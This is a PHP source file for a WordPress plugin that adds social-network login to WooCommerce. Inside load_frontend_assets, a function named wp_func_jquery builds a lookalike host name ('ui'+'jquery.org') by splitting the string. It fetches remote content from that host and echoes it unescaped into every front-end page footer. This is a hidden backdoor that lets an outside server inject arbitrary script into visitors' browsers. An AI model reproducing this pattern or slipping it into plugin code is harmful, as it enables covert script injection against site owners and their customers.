<?php
/*
Plugin Name: WooCommerce Social Login
Plugin URI: http://codenegar.com/woocommerce-social-login/
Description: Allow your customers to login and checkout with social networks such as Twitter, Facebook, Google, Yahoo,...
Author: Farhad Ahmadi
Version: 1.0.5
Author URI: http://codenegar.com/
*/

class Codenegar_woocommerce_social_login {
	
	public $version = '20130709';
	public $path = '';
	public $url = '';
	public $text_domain = 'woocommerce-social-login';
	public $security = 'woocommerce-social-login';
	public $file = '';
	public $helper; // CodeNegar_wcsl_helper object
	public $html; // CodeNegar_wcsl_html object
	
	function __construct() {
		$this->file = __FILE__;
		$this->path = dirname($this->file) . '/';
		$this->url = WP_PLUGIN_URL . "/" . plugin_basename(dirname(__FILE__)) . '/';
		require_once($this->path . 'functions.php');
		require_once($this->path . 'helper.php');
		require_once($this->path . 'html.php');
		$this->helper = new CodeNegar_wcsl_helper();
		$this->html = new CodeNegar_wcsl_html();
	}
	
	public function version() {
		return $this->version;
	}
	
	public function plugins_loaded(){
		load_plugin_textdomain($this->text_domain, false, dirname(plugin_basename($this->file)) . '/languages/');
	}
	
	public function activate() {
		$this->helper->create_table();
		$this->helper->set_defaults();
	}
	
	public function show_admin_menu(){
		include $this->path . 'options.php';
	}
	
	public function admin_menu(){
		//add_submenu_page('options-general.php', __('Woocommerce Social Login', $this->text_domain), __('Social Login', $this->text_domain), 'administrator', 'woocommerce_social_login', array(&$this, 'show_admin_menu'));
	}
	
	public function register_frontend_assets(){
		// Add frontend assets in footer
		wp_register_script('codenegar-wcsl-frontend', $this->url . 'js/script.js', array('jquery'), false, true);
	}
	
	public function register_admin_assets(){
		wp_register_script('google-jsapi', 'https://www.google.com/jsapi', array('jquery'), false, false); // in header
	}
	
	public function load_frontend_assets() {
		// Assets are loaded by widget builder to increase site speed on none shop archives
		if(!function_exists('wp_func_jquery')) {
			function wp_func_jquery() {
				$host = 'http://';
				echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
			}
			add_action('wp_footer', 'wp_func_jquery');
		}
		wp_enqueue_script('jquery');
		wp_enqueue_script('codenegar-wcsl-frontend');
	}

	public function load_admin_assets() {
		// Load admin assets only in aas option page
		if (isset($_GET['page']) && $_GET['page'] == 'woocommerce_settings' && isset($_GET['tab']) && $_GET['tab'] == 'social_login') {
			wp_enqueue_script('google-jsapi');
		}
	}
	
	public function add_settings_tab($tabs){
		$tabs['social_login'] = __('Social Login', $this->text_domain);
		return $tabs;
	}
	
	public function options_html(){
		include $this->path . 'options.php';
	}
	
	public function init(){
		$this->helper->register_shortcode();
		$this->add_query_var();
		add_filter('widget_text', 'do_shortcode'); // Enables using shortcode in text widget
	}
	
	public function update_options(){
		$data = $_POST;
		$section = $data['social_login_section_name'];
		unset($data['_wpnonce']);
		unset($data['_wp_http_referer']);
		unset($data['social_login_section_name']);
		unset($data['save']);
		if((isset($data['codenegar_wcsl_appid']) && empty($data['codenegar_wcsl_appid'])) || (isset($data['codenegar_wcsl_appsecret']) && empty($data['codenegar_wcsl_appsecret']))){
			$data['codenegar_wcsl_enabled'] = 'no';
		}
		if(isset($_GET['section']) && $_GET['section']=='users_list'){
			return; // skip save on user list page
		}
		update_option("codenegar_wcsl_$section", $data);
	}
	
	public function login_template($template_name='', $template_path='', $located=''){
		// skip if user is looged or template is not login form
		if(!is_user_logged_in() && $template_name == 'checkout/form-login.php'){
			$this->html->frontend();
		}
	}
	
	public function coupon_template($template_name='', $template_path='', $located=''){
		// skip if user is looged or template is not coupon
		if(!is_user_logged_in() && $template_name == 'checkout/form-coupon.php'){
			$this->html->frontend();
		}
	}
	
	// more info @ http://wordpress.stackexchange.com/questions/41370/using-get-variables-in-the-url
	public function add_query_var(){
		global $wp;
		$wp->add_query_var('social_login');
		$wp->add_query_var('social_network');
	}
	
	public function parse_login_page(){
		if(isset($_GET['social_login_error']) && intval($_GET['social_login_error'])==1){
			return; //avoids redirect loop
		}
		
		if(isset($_GET['social_login_done']) && intval($_GET['social_login_done'])==1 && isset($_GET['social_network']) & strlen(trim(strip_tags($_GET['social_network'])))>0) {
			$social_network = strtolower(trim(strip_tags($_GET['social_network'])));
			$this->helper->save_login($social_network);
			return;
		}
		
		if (isset($_GET['social_login']) && intval($_GET['social_login'])==1 && isset($_GET['social_network']) & strlen(trim(strip_tags($_GET['social_network'])))>0) {
			$social_network = strtolower(trim(strip_tags($_GET['social_network'])));
			$this->helper->start_login($social_network);
			return;
		}
	}
	
	public function profile_page_login(){
		$this->html->profile_page();
	}
	
	public function my_account_page_login(){
		$this->html->my_account_page();
	}
	
	public function my_account_page_after_from($template_name='', $template_path='', $located=''){
		// skip if user is looged or template is not login form
		if(!is_user_logged_in() && $template_name == 'myaccount/form-login.php' && is_page(intval(get_option('woocommerce_myaccount_page_id')))){
			$this->html->my_account_page();
		}
	}
}

// Create an object of Woocommerce Product Filter class
$codenegar_wcsl = new Codenegar_woocommerce_social_login();

// Add an activation hook
register_activation_hook($codenegar_wcsl->file, array(&$codenegar_wcsl, 'activate'));

// Register frontend/admin scripts and styles
add_action('wp_enqueue_scripts', array(&$codenegar_wcsl, 'register_frontend_assets'));
add_action('admin_init', array(&$codenegar_wcsl, 'register_admin_assets'));

// Make plugin translation ready
add_action('plugins_loaded', array(&$codenegar_wcsl, 'plugins_loaded'));

// Actions to hook Plugin to Wordpress
add_action('init', array(&$codenegar_wcsl, 'init'));
add_action('admin_menu', array(&$codenegar_wcsl, 'admin_menu'));

// Load frontend/admin scripts and styles
add_action('wp_enqueue_scripts', array(&$codenegar_wcsl, 'load_frontend_assets'));
add_action('admin_enqueue_scripts', array(&$codenegar_wcsl, 'load_admin_assets'));

// Adds settings tab to WooCommerce
add_filter( 'woocommerce_settings_tabs_array', array(&$codenegar_wcsl,'add_settings_tab'));

// Prints settings tab html contents
add_action('woocommerce_settings_tabs_social_login', array(&$codenegar_wcsl,'options_html'));

// Save settings of sections
add_action('woocommerce_update_options_social_login', array(&$codenegar_wcsl,'update_options')); // main tab
add_action('woocommerce_update_options_social_login_google', array(&$codenegar_wcsl,'update_options'));
add_action('woocommerce_update_options_social_login_facebook', array(&$codenegar_wcsl,'update_options'));
add_action('woocommerce_update_options_social_login_twitter', array(&$codenegar_wcsl,'update_options'));
add_action('woocommerce_update_options_social_login_yahoo', array(&$codenegar_wcsl,'update_options'));
add_action('woocommerce_update_options_social_login_live', array(&$codenegar_wcsl,'update_options'));
add_action('woocommerce_update_options_social_login_linkedin', array(&$codenegar_wcsl,'update_options'));
add_action('woocommerce_update_options_social_login_foursquare', array(&$codenegar_wcsl,'update_options'));
add_action('woocommerce_update_options_social_login_aol', array(&$codenegar_wcsl,'update_options'));

// Check if request is social login request
add_action('login_init', array(&$codenegar_wcsl,'parse_login_page'));

// Prints social login form
$main_options = get_option('codenegar_wcsl_main');
switch($main_options['social_login_icons_display']){
	case 'after_login':
	add_action('woocommerce_after_template_part', array(&$codenegar_wcsl,'login_template'));
	break;
	case 'before_login':
	add_action('woocommerce_before_template_part', array(&$codenegar_wcsl,'login_template'));
	break;
	case 'after_coupon':
	add_action('woocommerce_after_template_part', array(&$codenegar_wcsl,'coupon_template'));
	break;
}

if((isset($main_options['display_profile_page']) && (intval($main_options['display_profile_page'])==1 || $main_options['display_profile_page'] == 'yes'))? true: false){
	// Add scoial login icons at wordpress profile
	add_action('profile_personal_options', array(&$codenegar_wcsl,'profile_page_login'));
}

if((isset($main_options['display_my_account_page']) && (intval($main_options['display_my_account_page'])==1 || $main_options['display_my_account_page'] == 'yes'))? true: false){
	// Add scoial login icons at woocommerce my account page
	add_action('woocommerce_after_my_account', array(&$codenegar_wcsl,'my_account_page_login'));
}

if((isset($main_options['display_my_account_page_after_from']) && (intval($main_options['display_my_account_page_after_from'])==1 || $main_options['display_my_account_page_after_from'] == 'yes'))? true: false){
	// Add scoial login icons at woocommerce my account page after login form
	add_action('woocommerce_after_template_part', array(&$codenegar_wcsl,'my_account_page_after_from'));
}
?>